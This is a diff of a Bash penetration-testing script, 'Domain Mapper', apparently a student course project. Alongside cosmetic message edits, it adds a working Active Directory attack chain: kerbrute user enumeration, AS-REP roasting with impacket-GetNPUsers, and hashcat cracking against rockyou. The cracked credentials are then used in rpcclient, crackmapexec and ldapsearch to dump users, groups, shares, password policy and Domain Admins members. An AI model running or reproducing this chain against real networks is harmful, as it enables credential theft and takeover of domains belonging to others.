@@ -27,7 +27,6 @@
 
 
 # GLOBAL VARIABLES
-nipe_path=""
 timestamp=""
 current_dir=$(pwd)
 script_start=$(date +%s)
@@ -68,7 +67,7 @@ START() {
     fi
 
     timestamp=$(date +"%d%m%H%M%S")      # Save timestamp for session
-    figlet "DOMAIN MAPPER"         # Display banner
+    figlet "domain mapper"         # Display banner
     echo -e "\nOleksandr Shevchuk S21, TMagen773637\n"
 
     # Check internet and required utilities
@@ -181,7 +180,7 @@ SELECT_SCAN_METOD() {
             mkdir -p "$working_dir" > /dev/null 2>&1
 
             # Use fping to find live hosts in the target network and save IPs to live_hosts.txt
-            echo -e "\n\e[31m[!]\e[0m\e[32m Searching for live hosts...\e[0m"
+            echo -e "\n\e[31m[!]\e[0m\e[32m SEARCHING FOR LIVE HOSTS...\e[0m"
             fping -a -g "$network" 2>/dev/null | awk '{print $1}' | grep -v $(hostname -I | awk '{print $1}') > "$working_dir/live_hosts.txt" &
             SPINNER $!
             wait
@@ -212,7 +211,7 @@ SELECT_SCAN_METOD() {
 # Performs a basic TCP scan on live hosts with service/version detection.
 # Saves the results in TXT and converts to PDF for easy viewing.
 BASIC_SCAN() {
-    echo -e "\n\e[31m[!]\e[0m\e[32m Starting BASIC SCANNING...\e[0m"
+    echo -e "\n\e[31m[!]\e[0m\e[32m BASIC SCANNING...\e[0m"
 
     for ip in $(cat "$working_dir/live_hosts.txt"); do
         echo -e "\e[31m[*]\e[0m\e[32m Scanning: ${ip}\e[0m"
@@ -240,7 +239,7 @@ BASIC_SCAN() {
 # Performs a more thorough TCP scan on all 65535 ports of live hosts.
 # Includes version detection and vulnerability scripts. Results saved in TXT->PDF.
 INTERMEDIATE_SCAN() {
-    echo -e "\n\e[31m[!]\e[0m\e[32m Starting INTERMEDIATE SCANNING...\e[0m"
+    echo -e "\n\e[31m[!]\e[0m\e[32m INTERMEDIATE SCANNING...\e[0m"
 
     for ip in $(cat "$working_dir/live_hosts.txt"); do
         echo -e "\e[31m[*]\e[0m\e[32m Scanning: ${ip}\e[0m"
@@ -268,7 +267,7 @@ INTERMEDIATE_SCAN() {
 # Performs the most comprehensive scan: TCP SYN scan on all ports with OS detection,
 # plus UDP scan on top 20 ports. Uses vulnerability scripts and saves results in TXT->PDF.
 FULL_SCAN() {
-    echo -e "\n\e[31m[!]\e[0m\e[32m Starting FULL SCANNING...\e[0m"
+    echo -e "\n\e[31m[!]\e[0m\e[32m FULL SCANNING...\e[0m"
 
     for ip in $(cat "$working_dir/live_hosts.txt"); do
         echo -e "\e[31m[*]\e[0m\e[32m Scanning: ${ip}\e[0m"
@@ -308,12 +307,12 @@ ENUMERATION_MODE_SELECTOR() {
 
         # Run the corresponding enumeration function based on user choice
         if [[ "$user_choice" =~ ^[Bb]$ ]]; then
-            echo -e "\n\e[31m[!]\e[0m\e[32m Starting BASIC ENUMERATION...\e[0m"
+            echo -e "\n\e[31m[!]\e[0m\e[32m BASIC ENUMERATION...\e[0m"
             BASIC_ENUMERATION
             break
 
         elif [[ "$user_choice" =~ ^[Ii]$ ]]; then
-            echo -e "\n\e[31m[!]\e[0m\e[32m Starting INTERMEDIATE ENUMERATION...\e[0m"
+            echo -e "\n\e[31m[!]\e[0m\e[32m INTERMEDIATE ENUMERATION...\e[0m"
             INTERMEDIATE_ENUMERATION
             break
 
@@ -330,7 +329,7 @@ ENUMERATION_MODE_SELECTOR() {
             sleep 2
             
             # Prompt the user to enter the full path to a  userlist
-            read -r -p $'\e[34m[?]\e[0m Enter full path to userlist or press enter for default userlist: ' custom_userlist
+            read -r -p $'\e[31m[!]\e[0m\e[34m Enter full path to userlist or press enter for default userlist\e[0m: ' custom_userlist
 
             # If no custom userlist is provided, use the default userlist from GoogleDrive
             if [[ -z "$custom_userlist" ]]; then
@@ -344,7 +343,7 @@ ENUMERATION_MODE_SELECTOR() {
             fi
             
             # Prompt the user to enter the full path to a password list
-            read -r -p $'\e[34m[?]\e[0m Enter full path to passwordlist or press enter for default passwordlist: ' custom_passwdlist
+            read -r -p $'\e[31m[!]\e[0m\e[34m Enter full path to passwordlist or press enter for default passwordlist\e[0m: ' custom_passwdlist
 
             # If no custom password list is provided, use the default rockyou.txt
             if [[ -z "$custom_passwdlist" ]]; then
@@ -355,7 +354,7 @@ ENUMERATION_MODE_SELECTOR() {
             fi
             
             # Inform the user that Advanced Enumeration is starting
-            echo -e "\n\e[31m[!]\e[0m\e[32m Starting ADVANCE ENUMERATION...\e[0m"
+            echo -e "\n\e[31m[!]\e[0m\e[32m ADVANCE ENUMERATION...\e[0m"
             ADVANCED_ENUMERATION
             break
         else
@@ -377,7 +376,7 @@ BASIC_ENUMERATION() {
         host_dir="$working_dir/${target_ip}"
         scan_result_txt="$host_dir/result_${target_ip}.txt"
 
-        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${target_ip}\e[0m"
+        echo -e "\e[31m[*]\e[0m\e[32m ENUMERATION: ${target_ip}\e[0m"
         echo -e "\nBASIC ENUMERATION RESULT FOR ${target_ip}\n" >> "$scan_result_txt" 2>/dev/null
 
         tcp_ports=""
@@ -420,7 +419,6 @@ BASIC_ENUMERATION() {
 
 
 
-
 # INTERMEDIATE_ENUMERATION
 # Performs intermediate host enumeration: expands on BASIC_ENUMERATION results for each live host.
 # This function appends results to the TXT file already created in BASIC_ENUMERATION.
@@ -429,7 +427,7 @@ INTERMEDIATE_ENUMERATION() {
         host_dir="$working_dir/${target_ip}"
         scan_result_txt="$host_dir/result_${target_ip}.txt"
 
-        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${target_ip}\e[0m"
+        echo -e "\e[31m[*]\e[0m\e[32m ENUMERATION: ${target_ip}\e[0m"
         echo -e "\nINTERMEDIATE ENUMERATION RESULT FOR ${target_ip}\n" >> "$scan_result_txt" 2>/dev/null
 
         tcp_ports=""
@@ -474,82 +472,193 @@ INTERMEDIATE_ENUMERATION() {
 }
 
 
-# ADVANCED_ENUMERATION
 
+# ADVANCED_ENUMERATION
+# Performs advanced Active Directory enumeration
+# Expands on BASIC_ENUMERATION and INTERMEDIATE_ENUMERATIONresults for each live host.
+# Appends all findings to the existing per-host result file created by in BASIC_ENUMERATION
 ADVANCED_ENUMERATION() {
     for target_ip in $(cat "$working_dir/live_hosts.txt"); do
+        # Set `host_dir` path for the current target.
         host_dir="$working_dir/${target_ip}"
+        # Set `scan_result_txt` path for current target's result file.
         scan_result_txt="$host_dir/result_${target_ip}.txt"
 
-        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${target_ip}\e[0m"
+        # Print a colored header showing which host is being enumerated.
+        echo -e "\e[31m[*]\e[0m\e[32m ENUMERATION: ${target_ip}\e[0m"
+        # Append a titled header to the scan result file for this target.
         echo -e "\nADVANCED ENUMERATION RESULT FOR ${target_ip}\n" >> "$scan_result_txt" 2>/dev/null
 
+        # Initialize `tcp_ports` and `udp_ports` variables as empty.
         tcp_ports=""
         udp_ports=""
 
+        # If the results file contains TCP entries, extract TCP port numbers into `tcp_ports`.
         if grep -q '/tcp' "$scan_result_txt"; then
             tcp_ports=$(grep '/tcp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
         fi
 
+        # If the results file contains UDP entries, extract UDP port numbers into `udp_ports`.
         if grep -q '/udp' "$scan_result_txt"; then
             udp_ports=$(grep '/udp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
         fi
 
+        # Define a list of `common_ports` that should always be scanned.
         common_ports="21,22,139,445,389,636,3389,5985,5986"
+        # Combine discovered TCP/UDP ports with common ports into `all_ports`, deduplicated and sorted.
         all_ports=$(echo "$tcp_ports,$udp_ports,$common_ports" | tr ',' '\n' | grep -v '^$' | sort -n -u | paste -sd, -)
 
+        # If any ports are present, run `nmap` service/version detection on them and save open results to the scan file (running spinner in background).
         if [ -n "$all_ports" ]; then
             nmap -Pn -sV -p "$all_ports" "$target_ip" -oN - 2>/dev/null | grep -E '^PORT|/tcp|open'| grep -i -v 'filtered' >> "$scan_result_txt" 2>/dev/null &
+            # Show and wait for the spinner while the background scan runs.
             SPINNER $!
+            # Wait for the background nmap process to complete.
             wait
         fi
 
+        # Run `nmap` with SMB/LDAP/NetBIOS scripts against the common ports and append non-filtered output to the result file (with spinner).
         nmap -Pn -sV -p "$common_ports" --script smb-os-discovery,smb-enum-shares,smb-enum-users,ldap-search,smb-enum-domains,nbstat "$target_ip" 2>/dev/null | awk 'NR>3' | grep -i -v 'filtered' >> "$scan_result_txt" 2>/dev/null &
+        # Show and wait for the spinner while the script scan runs.
         SPINNER $!
+        # Wait for the script scan to finish.
         wait
 
+        # If LDAP/AD and Kerberos-related ports are found, declare the host as a Domain Controller.
         if grep -q "ldap.*Active Directory" "$scan_result_txt" && grep -q "88/tcp" "$scan_result_txt" && grep -q "3268/tcp" "$scan_result_txt"; then
             msg="[+] DOMAIN CONTROLLER DETECTED ${target_ip}"
+            # Log and print the domain controller detection message.
             echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
             echo -e "\e[33m$msg\e[0m"
 
+            # Extract the domain name from scan output for later use.
             domain=$(grep -i 'domain' "$scan_result_txt" | awk -F 'Domain:' '{print $2}' | awk -F ',' '{print $1}' | grep -v '^[[:space:]]*$' | head -1 | xargs)
             
+            # Run `kerbrute` user enumeration against the domain controller and save valid usernames to the scan file.
             kerbrute userenum  -d "$domain" --dc "${target_ip}" "$userlist" | grep VALID | awk '{print "VALID USERNAME  " $NF}' | sed 's/\x1b\[[0-9;]*m//g' >> "$scan_result_txt"
 
+            # Use `impacket-GetNPUsers` to request AS-REP/Preauth data and save krb-formatted hashes to `hashes_file`.
             hashes_file="$host_dir/hash_${target_ip}.txt"
             impacket-GetNPUsers "$domain"/ -usersfile "$userlist" -dc-ip ${target_ip} -format hashcat | grep -i '$krb' >> "$hashes_file"
             
+            # Run `hashcat` in the background to crack collected hashes using the provided password list (with spinner).
             credentials="$host_dir/creds_${target_ip}.txt"
             hashcat -m 18200 -a 0 "$hashes_file" "$passwdlist" >> "$credentials" --potfile-disable &
             SPINNER $!
+            # Wait for hashcat to finish cracking.
             wait
 
+            # If credentials were found, read only lines containing the literal "$krb" into an array.
             if [ -s "$credentials" ]; then
-                # Загружаем только строки, содержащие литерал "$krb", в массив lines
-                # Используем grep -F для буквального поиска '$krb'
+                # Use grep -F to match the literal '$krb' and load results into the array 'lines'.
                 mapfile -t lines < <(grep -F '$krb' "$credentials" 2>/dev/null || true)
 
-                # Проходим по массиву через for (как ты просил)
+                # Iterate over the collected hash lines to parse username and password pairs and log discovered credentials.
                 for line in "${lines[@]}"; do
                     brut_user=$(echo "$line" | awk -F '@' '{print $1}' | awk -F '$' '{print $NF}' | xargs) 2>/dev/null
                     brut_passwd=$(echo "$line"| awk -F '@' '{print $2}' | awk -F ':' '{print $NF}' | xargs) 2>/dev/null
                     pair="$brut_user:$brut_passwd" 
                     echo -e "\n[+] CREDENTIALS FOUND $pair" >> "$scan_result_txt" 2>/dev/null
                 done
+
+                # Announce and request a full user enumeration via `rpcclient` using the discovered credential pair.
+                msg="[+] OBTAINING ALL USER ACCOUNTS ${target_ip}"
+                echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
+                echo -e "\e[32m$msg\e[0m"
+
+                rpcclient -U "$domain"/"$brut_user"%"$brut_passwd" ${target_ip} -c "enumdomusers" >> "$scan_result_txt" 2>/dev/null
+                sleep 1
+
+                # Announce and request a full group enumeration via `rpcclient` using the discovered credential pair.
+                msg="[+] OOBTAINING ALL GROUPS ${target_ip}"
+                echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
+                echo -e "\e[32m$msg\e[0m"
+
+                rpcclient -U "$domain"/"$brut_user"%"$brut_passwd" ${target_ip} -c "enumdomgroups" >> "$scan_result_txt" 2>/dev/null
+                sleep 1
+
+                # Announce and list SMB shares via `crackmapexec` using the discovered credential pair.
+                msg="[+] OBTAINING ALL SHARES ${target_ip}"
+                echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
+                echo -e "\e[32m$msg\e[0m"
+
+                crackmapexec smb "${target_ip}" -u "$brut_user" -p "$brut_passwd" --shares | awk -F'4GE' 'NR>3{print $2}' >> "$scan_result_txt" 2>/dev/null
+                sleep 1
+
+                # Announce and retrieve the domain password policy via `crackmapexec`.
+                msg="[+] OBTAINING THE PASSWORD POLICY ${target_ip}"
+                echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
+                echo -e "\e[32m$msg\e[0m"
+
+                crackmapexec smb "${target_ip}" -u "$brut_user" -p "$brut_passwd" --pass-pol | awk -F'4GE' 'NR>3{print $2}' >> "$scan_result_txt" 2>/dev/null
+                sleep 1
+
+                # Announce and list members of the "Domain Admins" group via `crackmapexec`.
+                msg="[+] OBTAINING ACCOUNTS THAT ARE MEMBERS OF THE DOMAIN ADMINS GROUP ${target_ip}"
+                echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
+                echo -e "\e[32m$msg\e[0m"
+
+                crackmapexec smb "${target_ip}" -u "$brut_user" -p "$brut_passwd" --group "Domain Admins" | awk -F'4GE' 'NR>3{print $2}' | awk -F '\\' '{print $2}' >> "$scan_result_txt" 2>/dev/null
+                sleep 1
+
+                # Announce and query for disabled accounts using an LDAP search bound as the discovered user.
+                msg="[+] OBTAINING DISABLED ACCOUNTS (Flag: 2 / ADS_UF_ACCOUNTDISABLE) on ${target_ip}"
+                echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
+                echo -e "\e[32m$msg\e[0m"
+
+                # Convert the domain name into a DN-formatted string `domain_dc` (e.g., `DC=example,DC=com`).
+                domain_dc=$(echo "$domain" | awk -F '.' '{
+                    ORS=""; 
+                        for (i=1; i<=NF; i++) {
+                        print "DC="$i; 
+                        if (i<NF) print ","
+                    }; 
+                    print "\n"
+                }')
+                # Build a Bind DN for LDAP using the discovered username and `domain_dc`.
+                bind_dn="CN="$brut_user",CN=Users,"$domain_dc""
+
+                # Perform an LDAP search for accounts with the "account disabled" flag and save sAMAccountName results.
+                ldapsearch -LLL -x \
+                    -H "ldap://${target_ip}" \
+                    -D "$bind_dn" \
+                    -w "$brut_passwd" \
+                    -b "$domain_dc" \
+                    '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' \
+                    sAMAccountName | grep sAMAccountName: | awk '{print $NF}' >> "$scan_result_txt" 2>/dev/null
+                    sleep 1
+
+                # Announce and perform an LDAP search for accounts with the "password never expires" flag and save sAMAccountName results.
+                msg="[+] OBTAINING ACCOUNTS THAT NEVER EXPIRE (Flag: 1048576 / ADS_UF_DONT_EXPIRE_PASSWD) on ${target_ip}"
+                echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
+                echo -e "\e[32m$msg\e[0m"
+
+                # Perform LDAP search for accounts with the "password never expires" flag and append results.
+                ldapsearch -LLL -x \
+                    -H "ldap://${target_ip}" \
+                    -D "$bind_dn" \
+                    -w "$brut_passwd" \
+                    -b "$domain_dc" \
+                    '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))' \
+                    sAMAccountName | grep sAMAccountName: | awk '{print $NF}' >> "$scan_result_txt" 2>/dev/null
             fi
         fi
     done
 
+    # Detect the active network interface (exclude loopback).
     interface=$(ip -o -4 addr show up | awk '!/lo/ {print $2; exit}')
+    # Run `nmap` DHCP broadcast discovery on that interface and capture the output.
     dhcp_output=$(nmap -e "$interface" --script broadcast-dhcp-discover 2>/dev/null)
+    # If a DHCP server is reported, extract its IP, announce detection, and append the message to the scan result file.
     if echo "$dhcp_output" | grep -q "Server Identifier:"; then
         dhcp_ip=$(echo "$dhcp_output" | grep "Server Identifier:" | awk -F ':' '{print $NF}' | tr -d ' ')
         msg="[+] DHCP SERVER DETECTED ${dhcp_ip}"
         echo -e "\n$msg" >> "$scan_result_txt" 2>/dev/null
         echo -e "\e[33m$msg\e[0m"
+        sleep 1
     fi
 }
+
 
 
 # STOP - Stops the Nipe service, restores original IP and MAC address, and cleans up.
